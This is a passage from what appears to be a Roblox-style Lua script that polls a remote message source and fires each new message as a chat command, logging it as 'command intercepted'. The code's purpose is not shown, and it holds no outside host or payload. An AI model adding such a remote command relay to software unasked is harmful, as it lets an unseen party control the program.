	oldvalue=getMsg()
	while wait(1) do
		command=getMsg()
		if oldvalue~=command then
			local fired=command:gsub("|%d+|$", "")
			print("command intercepted\n->", fired)
			pcall(chatconnector.fire, fired, true)
			oldvalue=command
		end
	end
else
	print("remote disabled")
end

print("done")

return "\"Who que\5efed in your cornflakes?\" - grub, 2k15"